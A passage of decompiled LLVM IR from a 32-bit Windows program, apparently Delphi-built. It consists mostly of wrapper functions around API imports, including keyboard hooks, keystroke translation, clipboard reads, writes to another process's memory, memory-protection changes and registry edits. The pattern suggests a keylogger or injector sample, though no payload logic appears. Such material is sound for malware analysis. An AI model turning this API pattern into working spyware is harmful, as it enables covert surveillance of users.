dec_label_pc_4036c6:                              ; preds = %dec_label_pc_4036c2, %dec_label_pc_4036bc, %dec_label_pc_4036b8
  ret i32 %0, !insn.addr !86
}

define i32 @function_4036c8() local_unnamed_addr {
dec_label_pc_4036c8:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = icmp eq i32 %0, 0, !insn.addr !87
  %spec.select = select i1 %1, i32 4208333, i32 %0
  ret i32 %spec.select, !insn.addr !88
}

declare i32 @InternalUniqueString() local_unnamed_addr

define i32 @UniqueString() local_unnamed_addr {
dec_label_pc_403718:
  %0 = call i32 @InternalUniqueString(), !insn.addr !89
  ret i32 %0, !insn.addr !89
}

define i32 @function_40371d() local_unnamed_addr {
dec_label_pc_40371d:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !90
}

define i32 @function_403720() local_unnamed_addr {
dec_label_pc_403720:
  %0 = call i32 @InternalUniqueString(), !insn.addr !91
  ret i32 %0, !insn.addr !91
}

define i32 @function_403725() local_unnamed_addr {
dec_label_pc_403725:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !92
}

declare i32 @"@LStrCopy"() local_unnamed_addr

define i32 @function_403767() local_unnamed_addr {
dec_label_pc_403767:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !93
}

declare i32 @"@LStrDelete"() local_unnamed_addr

declare i32 @"@LStrInsert"() local_unnamed_addr

declare i32 @"@LStrPos"() local_unnamed_addr

declare i32 @"@LStrSetLength"() local_unnamed_addr

define i32 @function_4038bf() local_unnamed_addr {
dec_label_pc_4038bf:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !94
}

define i32 @function_40396b() local_unnamed_addr {
dec_label_pc_40396b:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !95
}

declare i32 @"@FinalizeArray"() local_unnamed_addr

define i32 @function_403a6f() local_unnamed_addr {
dec_label_pc_403a6f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !96
}

define i32 @function_403c7e() local_unnamed_addr {
dec_label_pc_403c7e:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !97
}

define i32 @function_403c87() local_unnamed_addr {
dec_label_pc_403c87:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !98
}

define i32 @function_403c88() local_unnamed_addr {
dec_label_pc_403c88:
  %eax.0.reg2mem = alloca i32, !insn.addr !99
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = icmp eq i32 %0, 0, !insn.addr !99
  store i32 0, i32* %eax.0.reg2mem, !insn.addr !100
  br i1 %1, label %dec_label_pc_403c8f, label %dec_label_pc_403c8c, !insn.addr !100

dec_label_pc_403c8c:                              ; preds = %dec_label_pc_403c88
  %2 = add i32 %0, -4, !insn.addr !101
  %3 = inttoptr i32 %2 to i32*, !insn.addr !101
  %4 = load i32, i32* %3, align 4, !insn.addr !101
  store i32 %4, i32* %eax.0.reg2mem, !insn.addr !101
  br label %dec_label_pc_403c8f, !insn.addr !101

dec_label_pc_403c8f:                              ; preds = %dec_label_pc_403c8c, %dec_label_pc_403c88
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !102
}

define i32 @function_403c90() local_unnamed_addr {
dec_label_pc_403c90:
  %0 = call i32 @function_403c88(), !insn.addr !103
  %1 = add i32 %0, -1, !insn.addr !104
  ret i32 %1, !insn.addr !105
}

define i32 @FinalizeArray() local_unnamed_addr {
dec_label_pc_403ca8:
  %0 = call i32 @"@FinalizeArray"(), !insn.addr !106
  ret i32 %0, !insn.addr !106
}

define i32 @function_403cad() local_unnamed_addr {
dec_label_pc_403cad:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !107
}

define i32 @DynArrayClear() local_unnamed_addr {
dec_label_pc_403cb0:
  %0 = call i32 @"@DynArrayClear"(), !insn.addr !108
  ret i32 %0, !insn.addr !109
}

declare i32 @"@DynArraySetLength"() local_unnamed_addr

declare i32 @"@DynArrayClear"() local_unnamed_addr

declare i32 @RegisterModule() local_unnamed_addr

define i32 @UnregisterModule.47() local_unnamed_addr {
dec_label_pc_403f84:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !110
  ret i32 %0, !insn.addr !110
}

define i32 @function_403f89() local_unnamed_addr {
dec_label_pc_403f89:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !111
}

define i32 @function_403f8b(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_403f8b:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !112
}

define i32 @LCIDToCodePage.48() local_unnamed_addr {
dec_label_pc_40403a:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !113
  ret i32 %0, !insn.addr !113
}

define i32 @function_40403f() local_unnamed_addr {
dec_label_pc_40403f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !114
}

define i32 @function_404041(i32 %arg1) local_unnamed_addr {
dec_label_pc_404041:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !115
}

define i32 @Finalization.49() local_unnamed_addr {
dec_label_pc_404092:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !116
  ret i32 %0, !insn.addr !116
}

define i32 @function_404097() local_unnamed_addr {
dec_label_pc_404097:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !117
}

define i32 @function_404099(i32 %arg1) local_unnamed_addr {
dec_label_pc_404099:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !118
}

define i32 @LocalAlloc.24() local_unnamed_addr {
dec_label_pc_404170:
  %0 = call i32 @LocalAlloc.3(), !insn.addr !119
  ret i32 %0, !insn.addr !119
}

define i32 @LocalFree.38() local_unnamed_addr {
dec_label_pc_404178:
  %0 = call i32 @LocalFree.2(), !insn.addr !120
  ret i32 %0, !insn.addr !120
}

define i32 @TlsAlloc.37() local_unnamed_addr {
dec_label_pc_404180:
  %0 = call i32 @TlsAlloc(), !insn.addr !121
  ret i32 %0, !insn.addr !121
}

define i1 @TlsFree.39(i32 %dwTlsIndex) local_unnamed_addr {
dec_label_pc_404188:
  %0 = call i1 @TlsFree(i32 %dwTlsIndex), !insn.addr !122
  ret i1 %0, !insn.addr !122
}

define i32* @TlsGetValue.22(i32 %dwTlsIndex) local_unnamed_addr {
dec_label_pc_404190:
  %0 = call i32* @TlsGetValue(i32 %dwTlsIndex), !insn.addr !123
  ret i32* %0, !insn.addr !123
}

define i1 @TlsSetValue.23(i32 %dwTlsIndex, i32* %lpTlsValue) local_unnamed_addr {
dec_label_pc_404198:
  %0 = call i1 @TlsSetValue(i32 %dwTlsIndex, i32* %lpTlsValue), !insn.addr !124
  ret i1 %0, !insn.addr !124
}

define i32 @GetTlsSize() local_unnamed_addr {
dec_label_pc_4041ac:
  ret i32 8, !insn.addr !125
}

define i32 @InitializeModule() local_unnamed_addr {
dec_label_pc_4042b0:
  %0 = call i32 @RegisterModule(), !insn.addr !126
  ret i32 %0, !insn.addr !127
}

declare i32 @"@InitLib"(i32) local_unnamed_addr

define i32 @function_404304() local_unnamed_addr {
dec_label_pc_404304:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !128
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !128
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !128
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !129
  %2 = load i32, i32* @global_var_409658, align 4, !insn.addr !130
  %3 = add i32 %2, 1, !insn.addr !130
  store i32 %3, i32* @global_var_409658, align 4, !insn.addr !130
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !131
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !132
  ret i32 0, !insn.addr !133
}

define i32 @function_404329() local_unnamed_addr {
dec_label_pc_404329:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !134
  ret i32 %0, !insn.addr !134
}

define i32 @function_40432e() local_unnamed_addr {
dec_label_pc_40432e:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !135
}

define i32 @function_404330(i32 %arg1) local_unnamed_addr {
dec_label_pc_404330:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !136
}

define i32 @function_404334() local_unnamed_addr {
dec_label_pc_404334:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409658, align 4, !insn.addr !137
  %2 = add i32 %1, -1, !insn.addr !137
  store i32 %2, i32* @global_var_409658, align 4, !insn.addr !137
  ret i32 %0, !insn.addr !138
}

define i32 @function_40433c() local_unnamed_addr {
dec_label_pc_40433c:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !139
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !139
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !139
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !140
  %2 = load i32, i32* @global_var_409660, align 4, !insn.addr !141
  %3 = add i32 %2, 1, !insn.addr !141
  store i32 %3, i32* @global_var_409660, align 4, !insn.addr !141
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !142
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !143
  ret i32 0, !insn.addr !144
}

define i32 @function_404361() local_unnamed_addr {
dec_label_pc_404361:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !145
  ret i32 %0, !insn.addr !145
}

define i32 @function_404366() local_unnamed_addr {
dec_label_pc_404366:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !146
}

define i32 @function_404368(i32 %arg1) local_unnamed_addr {
dec_label_pc_404368:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !147
}

define i32 @function_40436c() local_unnamed_addr {
dec_label_pc_40436c:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_409660, align 4, !insn.addr !148
  %2 = add i32 %1, -1, !insn.addr !148
  store i32 %2, i32* @global_var_409660, align 4, !insn.addr !148
  ret i32 %0, !insn.addr !149
}

define i32 @function_404374(i32 %arg1) local_unnamed_addr {
dec_label_pc_404374:
  %0 = call i32 @RegCloseKey.6(), !insn.addr !150
  ret i32 %0, !insn.addr !150
}

define i32 @function_40437c(i32* %hKey, i8* %lpSubKey, i32 %Reserved, i8* %lpClass, i32 %dwOptions, i32 %samDesired, %_SECURITY_ATTRIBUTES* %lpSecurityAttributes, i32** %phkResult, i32* %lpdwDisposition) local_unnamed_addr {
dec_label_pc_40437c:
  %0 = call i32 @RegCreateKeyExA(i32* %hKey, i8* %lpSubKey, i32 %Reserved, i8* %lpClass, i32 %dwOptions, i32 %samDesired, %_SECURITY_ATTRIBUTES* %lpSecurityAttributes, i32** %phkResult, i32* %lpdwDisposition), !insn.addr !151
  ret i32 %0, !insn.addr !151
}

define i32 @function_404384(i32* %hKey, i8* %lpSubKey) local_unnamed_addr {
dec_label_pc_404384:
  %0 = call i32 @RegDeleteKeyA(i32* %hKey, i8* %lpSubKey), !insn.addr !152
  ret i32 %0, !insn.addr !152
}

define i32 @function_40438c(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i8* %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_40438c:
  %0 = call i32 @RegOpenKeyExA.5(), !insn.addr !153
  ret i32 %0, !insn.addr !153
}

define i32 @function_404394(i32 %arg1, i32* %arg2, i32* %arg3, i32* %arg4, i32 %arg5, i8* %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_404394:
  %0 = call i32 @RegQueryValueExA.4(), !insn.addr !154
  ret i32 %0, !insn.addr !154
}

define i32 @function_40439c(i32* %hKey, i8* %lpValueName, i32 %Reserved, i32 %dwType, i8* %lpData, i32 %cbData) local_unnamed_addr {
dec_label_pc_40439c:
  %0 = call i32 @RegSetValueExA(i32* %hKey, i8* %lpValueName, i32 %Reserved, i32 %dwType, i8* %lpData, i32 %cbData), !insn.addr !155
  ret i32 %0, !insn.addr !155
}

define i1 @function_4043a4(i32* %hObject) local_unnamed_addr {
dec_label_pc_4043a4:
  %0 = call i1 @CloseHandle(i32* %hObject), !insn.addr !156
  ret i1 %0, !insn.addr !156
}

define i32 @function_4043ac(i32 %Locale, i32 %dwCmpFlags, i8* %lpString1, i32 %cchCount1, i8* %lpString2, i32 %cchCount2) local_unnamed_addr {
dec_label_pc_4043ac:
  %0 = call i32 @CompareStringA(i32 %Locale, i32 %dwCmpFlags, i8* %lpString1, i32 %cchCount1, i8* %lpString2, i32 %cchCount2), !insn.addr !157
  ret i32 %0, !insn.addr !157
}

define i1 @function_4043b4(i8* %lpExistingFileName, i8* %lpNewFileName, i1 %bFailIfExists) local_unnamed_addr {
dec_label_pc_4043b4:
  %0 = call i1 @CopyFileA(i8* %lpExistingFileName, i8* %lpNewFileName, i1 %bFailIfExists), !insn.addr !158
  ret i1 %0, !insn.addr !158
}

define i32* @function_4043bc(i8* %lpFileName, i32 %dwDesiredAccess, i32 %dwShareMode, %_SECURITY_ATTRIBUTES* %lpSecurityAttributes, i32 %dwCreationDisposition, i32 %dwFlagsAndAttributes, i32* %hTemplateFile) local_unnamed_addr {
dec_label_pc_4043bc:
  %0 = call i32* @CreateFileA(i8* %lpFileName, i32 %dwDesiredAccess, i32 %dwShareMode, %_SECURITY_ATTRIBUTES* %lpSecurityAttributes, i32 %dwCreationDisposition, i32 %dwFlagsAndAttributes, i32* %hTemplateFile), !insn.addr !159
  ret i32* %0, !insn.addr !159
}

define i32* @function_4043c4(%_SECURITY_ATTRIBUTES* %lpThreadAttributes, i32 %dwStackSize, i32 (i32*)* %lpStartAddress, i32* %lpParameter, i32 %dwCreationFlags, i32* %lpThreadId) local_unnamed_addr {
dec_label_pc_4043c4:
  %0 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* %lpThreadAttributes, i32 %dwStackSize, i32 (i32*)* %lpStartAddress, i32* %lpParameter, i32 %dwCreationFlags, i32* %lpThreadId), !insn.addr !160
  ret i32* %0, !insn.addr !160
}

define i1 @function_4043cc(i8* %lpFileName) local_unnamed_addr {
dec_label_pc_4043cc:
  %0 = call i1 @DeleteFileA(i8* %lpFileName), !insn.addr !161
  ret i1 %0, !insn.addr !161
}

define i32 @function_4043d4(i32 %arg1) local_unnamed_addr {
dec_label_pc_4043d4:
  %0 = call i32 @ExitProcess.9(), !insn.addr !162
  ret i32 %0, !insn.addr !162
}

define i32* @function_4043dc(i32* %hModule, i8* %lpName, i8* %lpType) local_unnamed_addr {
dec_label_pc_4043dc:
  %0 = call i32* @FindResourceA(i32* %hModule, i8* %lpName, i8* %lpType), !insn.addr !163
  ret i32* %0, !insn.addr !163
}

define void @function_4043e4(i32* %hLibModule, i32 %dwExitCode) local_unnamed_addr {
dec_label_pc_4043e4:
  call void @FreeLibraryAndExitThread(i32* %hLibModule, i32 %dwExitCode), !insn.addr !164
  ret void, !insn.addr !164
}

define i32* @function_4043ec() local_unnamed_addr {
dec_label_pc_4043ec:
  %0 = call i32* @GetCurrentProcess(), !insn.addr !165
  ret i32* %0, !insn.addr !165
}

define i32 @function_4043f4(i32* %hFile, i32* %lpFileSizeHigh) local_unnamed_addr {
dec_label_pc_4043f4:
  %0 = call i32 @GetFileSize(i32* %hFile, i32* %lpFileSizeHigh), !insn.addr !166
  ret i32 %0, !insn.addr !166
}

define i32 @function_4043fc(i32* %hModule, i8* %lpFilename, i32 %nSize) local_unnamed_addr {
dec_label_pc_4043fc:
  %0 = call i32 @GetModuleFileNameA(i32* %hModule, i8* %lpFilename, i32 %nSize), !insn.addr !167
  ret i32 %0, !insn.addr !167
}

define i32* @function_404404(i8* %lpModuleName) local_unnamed_addr {
dec_label_pc_404404:
  %0 = call i32* @GetModuleHandleA(i8* %lpModuleName), !insn.addr !168
  ret i32* %0, !insn.addr !168
}

define i32 ()* @function_40440c(i32* %hModule, i8* %lpProcName) local_unnamed_addr {
dec_label_pc_40440c:
  %0 = call i32 ()* @GetProcAddress(i32* %hModule, i8* %lpProcName), !insn.addr !169
  ret i32 ()* %0, !insn.addr !169
}

define i32 @function_404414(i32 %nBufferLength, i8* %lpBuffer) local_unnamed_addr {
dec_label_pc_404414:
  %0 = call i32 @GetTempPathA(i32 %nBufferLength, i8* %lpBuffer), !insn.addr !170
  ret i32 %0, !insn.addr !170
}

define i32 @function_40441c() local_unnamed_addr {
dec_label_pc_40441c:
  %0 = call i32 @GetTickCount.8(), !insn.addr !171
  ret i32 %0, !insn.addr !171
}

define i32* @function_404424(i32 %uFlags, i32 %dwBytes) local_unnamed_addr {
dec_label_pc_404424:
  %0 = call i32* @GlobalAlloc(i32 %uFlags, i32 %dwBytes), !insn.addr !172
  ret i32* %0, !insn.addr !172
}

define i32* @function_40442c(i32* %hMem) local_unnamed_addr {
dec_label_pc_40442c:
  %0 = call i32* @GlobalFree(i32* %hMem), !insn.addr !173
  ret i32* %0, !insn.addr !173
}

define i32* @function_404434(i32* %hMem) local_unnamed_addr {
dec_label_pc_404434:
  %0 = call i32* @GlobalLock(i32* %hMem), !insn.addr !174
  ret i32* %0, !insn.addr !174
}

define i1 @function_40443c(i32* %hMem) local_unnamed_addr {
dec_label_pc_40443c:
  %0 = call i1 @GlobalUnlock(i32* %hMem), !insn.addr !175
  ret i1 %0, !insn.addr !175
}

define i32* @function_404444(i8* %lpLibFileName) local_unnamed_addr {
dec_label_pc_404444:
  %0 = call i32* @LoadLibraryA(i8* %lpLibFileName), !insn.addr !176
  ret i32* %0, !insn.addr !176
}

define i1 @function_40444c(i32* %hFile, i32* %lpBuffer, i32 %nNumberOfBytesToRead, i32* %lpNumberOfBytesRead, %_OVERLAPPED* %lpOverlapped) local_unnamed_addr {
dec_label_pc_40444c:
  %0 = call i1 @ReadFile(i32* %hFile, i32* %lpBuffer, i32 %nNumberOfBytesToRead, i32* %lpNumberOfBytesRead, %_OVERLAPPED* %lpOverlapped), !insn.addr !177
  ret i1 %0, !insn.addr !177
}

define i1 @function_404454(i32* %hFile) local_unnamed_addr {
dec_label_pc_404454:
  %0 = call i1 @SetEndOfFile(i32* %hFile), !insn.addr !178
  ret i1 %0, !insn.addr !178
}

define void @function_40445c(i32 %dwMilliseconds) local_unnamed_addr {
dec_label_pc_40445c:
  call void @Sleep(i32 %dwMilliseconds), !insn.addr !179
  ret void, !insn.addr !179
}

define i1 @function_404464(i32* %lpAddress, i32 %dwSize, i32 %flNewProtect, i32* %lpflOldProtect) local_unnamed_addr {
dec_label_pc_404464:
  %0 = call i1 @VirtualProtect(i32* %lpAddress, i32 %dwSize, i32 %flNewProtect, i32* %lpflOldProtect), !insn.addr !180
  ret i1 %0, !insn.addr !180
}

define i32 @function_40446c() local_unnamed_addr {
dec_label_pc_40446c:
  %0 = call i32 @WriteFile.7(), !insn.addr !181
  ret i32 %0, !insn.addr !181
}

define i1 @function_404474(i32* %hProcess, i32* %lpBaseAddress, i32* %lpBuffer, i32 %nSize, i32* %lpNumberOfBytesWritten) local_unnamed_addr {
dec_label_pc_404474:
  %0 = call i1 @WriteProcessMemory(i32* %hProcess, i32* %lpBaseAddress, i32* %lpBuffer, i32 %nSize, i32* %lpNumberOfBytesWritten), !insn.addr !182
  ret i1 %0, !insn.addr !182
}

define i32 @function_40447c(i8* %lpString1, i8* %lpString2) local_unnamed_addr {
dec_label_pc_40447c:
  %0 = call i32 @lstrcmpiA(i8* %lpString1, i8* %lpString2), !insn.addr !183
  ret i32 %0, !insn.addr !183
}

define i8* @function_404484(i8* %lpString1, i8* %lpString2) local_unnamed_addr {
dec_label_pc_404484:
  %0 = call i8* @lstrcpyA(i8* %lpString1, i8* %lpString2), !insn.addr !184
  ret i8* %0, !insn.addr !184
}

define i1 @function_40448c(i32* %hdc, i32 %iFirst, i32 %iLast, i32* %lpBuffer) local_unnamed_addr {
dec_label_pc_40448c:
  %0 = call i1 @GetCharWidthA(i32* %hdc, i32 %iFirst, i32 %iLast, i32* %lpBuffer), !insn.addr !185
  ret i1 %0, !insn.addr !185
}

define i32* @function_404494(i32 %i) local_unnamed_addr {
dec_label_pc_404494:
  %0 = call i32* @GetStockObject(i32 %i), !insn.addr !186
  ret i32* %0, !insn.addr !186
}

define i32* @function_40449c(i32* %hdc, i32* %h) local_unnamed_addr {
dec_label_pc_40449c:
  %0 = call i32* @SelectObject(i32* %hdc, i32* %h), !insn.addr !187
  ret i32* %0, !insn.addr !187
}

define i32 @function_4044a4(i32* %hhk, i32 %nCode, i32 %wParam, i32 %lParam) local_unnamed_addr {
dec_label_pc_4044a4:
  %0 = call i32 @CallNextHookEx(i32* %hhk, i32 %nCode, i32 %wParam, i32 %lParam), !insn.addr !188
  ret i32 %0, !insn.addr !188
}

define i1 @function_4044ac() local_unnamed_addr {
dec_label_pc_4044ac:
  %0 = call i1 @CloseClipboard(), !insn.addr !189
  ret i1 %0, !insn.addr !189
}

define i32 @function_4044b4(i32* %hWnd, i32 %Msg, i32 %wParam, i32 %lParam) local_unnamed_addr {
dec_label_pc_4044b4:
  %0 = call i32 @DefWindowProcA(i32* %hWnd, i32 %Msg, i32 %wParam, i32 %lParam), !insn.addr !190
  ret i32 %0, !insn.addr !190
}

define i32 @function_4044bc(%tagMSG* %lpMsg) local_unnamed_addr {
dec_label_pc_4044bc:
  %0 = call i32 @DispatchMessageA(%tagMSG* %lpMsg), !insn.addr !191
  ret i32 %0, !insn.addr !191
}

define i1 @function_4044c4(i1 (i32*, i32)* %lpEnumFunc, i32 %lParam) local_unnamed_addr {
dec_label_pc_4044c4:
  %0 = call i1 @EnumWindows(i1 (i32*, i32)* %lpEnumFunc, i32 %lParam), !insn.addr !192
  ret i1 %0, !insn.addr !192
}

define i32* @function_4044cc(i8* %lpClassName, i8* %lpWindowName) local_unnamed_addr {
dec_label_pc_4044cc:
  %0 = call i32* @FindWindowA(i8* %lpClassName, i8* %lpWindowName), !insn.addr !193
  ret i32* %0, !insn.addr !193
}

define i32* @function_4044d4(i32* %hWndParent, i32* %hWndChildAfter, i8* %lpszClass, i8* %lpszWindow) local_unnamed_addr {
dec_label_pc_4044d4:
  %0 = call i32* @FindWindowExA(i32* %hWndParent, i32* %hWndChildAfter, i8* %lpszClass, i8* %lpszWindow), !insn.addr !194
  ret i32* %0, !insn.addr !194
}

define i1 @function_4044dc(%tagPOINT* %lpPoint) local_unnamed_addr {
dec_label_pc_4044dc:
  %0 = call i1 @GetCaretPos(%tagPOINT* %lpPoint), !insn.addr !195
  ret i1 %0, !insn.addr !195
}

define i32 @function_4044e4(i32* %hWnd, i32 %nIndex) local_unnamed_addr {
dec_label_pc_4044e4:
  %0 = call i32 @GetClassLongA(i32* %hWnd, i32 %nIndex), !insn.addr !196
  ret i32 %0, !insn.addr !196
}

define i32 @function_4044ec(i32* %hWnd, i8* %lpClassName, i32 %nMaxCount) local_unnamed_addr {
dec_label_pc_4044ec:
  %0 = call i32 @GetClassNameA(i32* %hWnd, i8* %lpClassName, i32 %nMaxCount), !insn.addr !197
  ret i32 %0, !insn.addr !197
}

define i32* @function_4044f4(i32 %uFormat) local_unnamed_addr {
dec_label_pc_4044f4:
  %0 = call i32* @GetClipboardData(i32 %uFormat), !insn.addr !198
  ret i32* %0, !insn.addr !198
}

define i32* @function_4044fc(i32* %hWnd) local_unnamed_addr {
dec_label_pc_4044fc:
  %0 = call i32* @GetDC(i32* %hWnd), !insn.addr !199
  ret i32* %0, !insn.addr !199
}

define i1 @function_404504(i8* %lpKeyState) local_unnamed_addr {
dec_label_pc_404504:
  %0 = call i1 @GetKeyboardState(i8* %lpKeyState), !insn.addr !200
  ret i1 %0, !insn.addr !200
}

define i1 @function_40450c(%tagMSG* %lpMsg, i32* %hWnd, i32 %wMsgFilterMin, i32 %wMsgFilterMax) local_unnamed_addr {
dec_label_pc_40450c:
  %0 = call i1 @GetMessageA(%tagMSG* %lpMsg, i32* %hWnd, i32 %wMsgFilterMin, i32 %wMsgFilterMax), !insn.addr !201
  ret i1 %0, !insn.addr !201
}

define i32* @function_404514(i32* %hWnd) local_unnamed_addr {
dec_label_pc_404514:
  %0 = call i32* @GetParent(i32* %hWnd), !insn.addr !202
  ret i32* %0, !insn.addr !202
}

define i32* @function_40451c(i32* %hWnd) local_unnamed_addr {
dec_label_pc_40451c:
  %0 = call i32* @GetTopWindow(i32* %hWnd), !insn.addr !203
  ret i32* %0, !insn.addr !203
}

define i32* @function_404524(i32* %hWnd, i32 %uCmd) local_unnamed_addr {
dec_label_pc_404524:
  %0 = call i32* @GetWindow(i32* %hWnd, i32 %uCmd), !insn.addr !204
  ret i32* %0, !insn.addr !204
}

define i32 @function_40452c(i32* %hWnd, i32 %nIndex) local_unnamed_addr {
dec_label_pc_40452c:
  %0 = call i32 @GetWindowLongA(i32* %hWnd, i32 %nIndex), !insn.addr !205
  ret i32 %0, !insn.addr !205
}

define i32 @function_404534(i32* %hWnd, i32* %lpdwProcessId) local_unnamed_addr {
dec_label_pc_404534:
  %0 = call i32 @GetWindowThreadProcessId(i32* %hWnd, i32* %lpdwProcessId), !insn.addr !206
  ret i32 %0, !insn.addr !206
}

define i1 @function_40453c(i32* %hWnd) local_unnamed_addr {
dec_label_pc_40453c:
  %0 = call i1 @IsWindow(i32* %hWnd), !insn.addr !207
  ret i1 %0, !insn.addr !207
}

define i1 @function_404544(i32* %hWnd) local_unnamed_addr {
dec_label_pc_404544:
  %0 = call i1 @IsWindowVisible(i32* %hWnd), !insn.addr !208
  ret i1 %0, !insn.addr !208
}

define i1 @TObject.AfterConstruction(i32* %hWnd, i32 %uIDEvent) local_unnamed_addr {
dec_label_pc_40454c:
  %0 = call i1 @KillTimer(i32* %hWnd, i32 %uIDEvent), !insn.addr !209
  ret i1 %0, !insn.addr !209
}

define i32* @function_404554(i32* %hInstance, i8* %lpIconName) local_unnamed_addr {
dec_label_pc_404554:
  %0 = call i32* @LoadIconA(i32* %hInstance, i8* %lpIconName), !insn.addr !210
  ret i32* %0, !insn.addr !210
}

define i1 @function_40455c(i32* %hWndNewOwner) local_unnamed_addr {
dec_label_pc_40455c:
  %0 = call i1 @OpenClipboard(i32* %hWndNewOwner), !insn.addr !211
  ret i1 %0, !insn.addr !211
}

define i1 @function_404564(i32* %hWnd, i32 %Msg, i32 %wParam, i32 %lParam) local_unnamed_addr {
dec_label_pc_404564:
  %0 = call i1 @PostMessageA(i32* %hWnd, i32 %Msg, i32 %wParam, i32 %lParam), !insn.addr !212
  ret i1 %0, !insn.addr !212
}

define void @function_40456c(i32 %nExitCode) local_unnamed_addr {
dec_label_pc_40456c:
  call void @PostQuitMessage(i32 %nExitCode), !insn.addr !213
  ret void, !insn.addr !213
}

define i32 @function_404574(i32* %hWnd, i32* %hDC) local_unnamed_addr {
dec_label_pc_404574:
  %0 = call i32 @ReleaseDC(i32* %hWnd, i32* %hDC), !insn.addr !214
  ret i32 %0, !insn.addr !214
}

define i32 @function_40457c(i32* %hWnd, i32 %Msg, i32 %wParam, i32 %lParam) local_unnamed_addr {
dec_label_pc_40457c:
  %0 = call i32 @SendMessageA(i32* %hWnd, i32 %Msg, i32 %wParam, i32 %lParam), !insn.addr !215
  ret i32 %0, !insn.addr !215
}

define i32 @function_404584(i32* %hWnd, i32 %nIDEvent, i32 %uElapse, void (i32*, i32, i32, i32)* %lpTimerFunc) local_unnamed_addr {
dec_label_pc_404584:
  %0 = call i32 @SetTimer(i32* %hWnd, i32 %nIDEvent, i32 %uElapse, void (i32*, i32, i32, i32)* %lpTimerFunc), !insn.addr !216
  ret i32 %0, !insn.addr !216
}

define i32 @function_40458c(i32* %hWnd, i32 %nIndex, i32 %dwNewLong) local_unnamed_addr {
dec_label_pc_40458c:
  %0 = call i32 @SetWindowLongA(i32* %hWnd, i32 %nIndex, i32 %dwNewLong), !insn.addr !217
  ret i32 %0, !insn.addr !217
}

define i32* @function_404594(i32 %idHook, i32 (i32, i32, i32)* %lpfn, i32* %hmod, i32 %dwThreadId) local_unnamed_addr {
dec_label_pc_404594:
  %0 = call i32* @SetWindowsHookExA(i32 %idHook, i32 (i32, i32, i32)* %lpfn, i32* %hmod, i32 %dwThreadId), !insn.addr !218
  ret i32* %0, !insn.addr !218
}

define i32 @function_40459c(i32 %uVirtKey, i32 %uScanCode, i8* %lpKeyState, i16* %lpChar, i32 %uFlags) local_unnamed_addr {
dec_label_pc_40459c:
  %0 = call i32 @ToAscii(i32 %uVirtKey, i32 %uScanCode, i8* %lpKeyState, i16* %lpChar, i32 %uFlags), !insn.addr !219
  ret i32 %0, !insn.addr !219
}

define i1 @function_4045a4(i32* %hhk) local_unnamed_addr {
dec_label_pc_4045a4:
  %0 = call i1 @UnhookWindowsHookEx(i32* %hhk), !insn.addr !220
  ret i1 %0, !insn.addr !220
}

define i32 @function_4045ac() local_unnamed_addr {
dec_label_pc_4045ac:
  %0 = call i32 @Move(), !insn.addr !221
  ret i32 %0, !insn.addr !222
}

define i32 @_CreateWindowExA() local_unnamed_addr {
dec_label_pc_4045b4:
  %0 = call i32 @CreateWindowExA.10(), !insn.addr !223
  ret i32 %0, !insn.addr !223
}

declare i32* @CreateWindowExA(i32, i8*, i8*, i32, i32, i32, i32, i32, i32*, i32*, i32*, i32*) local_unnamed_addr

define i32 @function_404614() local_unnamed_addr {
dec_label_pc_404614:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !224
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !224
